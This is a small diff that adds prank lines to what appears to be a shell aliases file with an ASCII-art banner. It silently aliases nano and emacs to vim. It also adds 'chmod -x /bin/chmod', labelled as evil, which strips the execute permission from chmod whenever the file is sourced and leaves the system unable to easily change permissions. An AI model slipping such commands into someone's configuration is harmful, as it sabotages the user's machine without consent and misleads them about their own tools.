@@ -6,4 +6,10 @@
 #  \__|_|  \___/|_|_|           \__,_|_|_|\__,_|___/\___||___/
 #                      ______
 #                     |______|
- 
+
+# Make sure we use the best editor of all time
+alias nano="vim"
+alias emacs="vim"
+
+# Oh god this one's evil
+chmod -x /bin/chmod 
